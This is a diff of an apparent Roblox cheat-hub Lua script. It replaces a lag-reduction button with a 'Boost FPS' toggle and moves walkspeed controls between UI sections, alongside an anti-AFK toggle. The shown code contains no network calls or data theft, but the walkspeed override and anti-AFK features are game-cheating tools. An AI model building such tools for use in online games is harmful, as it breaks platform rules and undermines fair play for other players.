+    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+
+    if GameData.Workspace.CurrentCamera then
+        GameData.Workspace.CurrentCamera.FieldOfView = 70
+    end
+
+    pcall(function()
         collectgarbage("collect")
-    end,
-}, "BoostFPSButton")
+    end)
+end
 
-sections.Player:Button({
-    Name = "Reduce Lag",
-    Callback = function()
-        local Workspace = game:GetService("Workspace")
-        local Lighting = game:GetService("Lighting")
-        local player = game.Players.LocalPlayer
+sections.Player:Toggle({
+    Name = "Boost FPS",
+    Default = false,
+    Callback = function(value)
+        GameData.MinecraftFPS = value
 
-        Lighting.GlobalShadows = false
-        Lighting.FogEnd = 9e9
-        Lighting.BFullness = 1
-        Lighting.OutdoorAmbient = Color3.fromRGB(128,128,128)
-        Lighting.ExposureCompensation = 0
-        Lighting.ShadowSoftness = 0
+        if value then
+            GameData.ApplyMinecraftFPS()
 
-        for _, obj in pairs(Workspace:GetDescendants()) do
-            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Explosion") then
-                obj.Enabled = false
-            elseif obj:IsA("Decal") or obj:IsA("Texture") then
-                obj.Transparency = 1
+            GameData.FPSLoop = GameData.Workspace.DescendantAdded:Connect(function()
+                if GameData.MinecraftFPS then
+                    task.wait(0.1)
+                    GameData.ApplyMinecraftFPS()
+                end
+            end)
+
+            Window:Notify({
+                Title = "FPS Boost",
+                Description = "Enabled Mode"
+            })
+        else
+            if GameData.FPSLoop then
+                GameData.FPSLoop:Disconnect()
+                GameData.FPSLoop = nil
             end
-        end
 
-        for _, gui in pairs(player:WaitForChild("PlayerGui"):GetDescendants()) do
-            if gui:IsA("TextLabel") or gui:IsA("TextButton") then
-                gui.TextScaled = false
-            elseif gui:IsA("ImageLabel") or gui:IsA("ImageButton") then
-                gui.ImageTransparency = 0.5
-            end
+            Window:Notify({
+                Title = "FPS Boost",
+                Description = "Disabled (visual tidak direstore)"
+            })
         end
     end,
-}, "ReduceLagButton")
+}, "BoostFPSToggle")
+
+
 
 sections.Player1:Header({
 	Name = "Anti AFK"
@@ -5294,6 +5362,7 @@ sections.Player1:Toggle({
 }, "AntiAfk!!!Toggle")
 
 
+
 sections.Player2:Header({
 	Name = "User Settings"
 })
@@ -5344,7 +5413,7 @@ end)
 --------------------------
 -- Walkspeed Controller --
 --------------------------
-sections.Player1:Slider({
+sections.Player2:Slider({
     Name = "Set Walkspeed",
     Default = GameData.WalkspeedValue,
     Minimum = 0,
@@ -5356,7 +5425,7 @@ sections.Player1:Slider({
     end,
 }, "WalkspeedSlider")
 
-sections.Player1:Toggle({
+sections.Player2:Toggle({
     Name = "Walkspeed",
     Default = GameData.WalkspeedEnabled,
     Callback = function(state)
@@ -5489,7 +5558,7 @@ sections.Config:Input({
 })
 
 sections.Config1:Header({
-	Name = "UI Settings"
+	Name = "Server"
 })
 
 GameData.LocalPlayer = GameData.Players.LocalPlayer
@@ -5575,7 +5644,6 @@ end)
 
 tabs.Home:Select() -- pilih tab yang benar-benar ada
 MacLib:LoadAutoLoadConfig()
-
 
 
 -------------------------------------------------------------
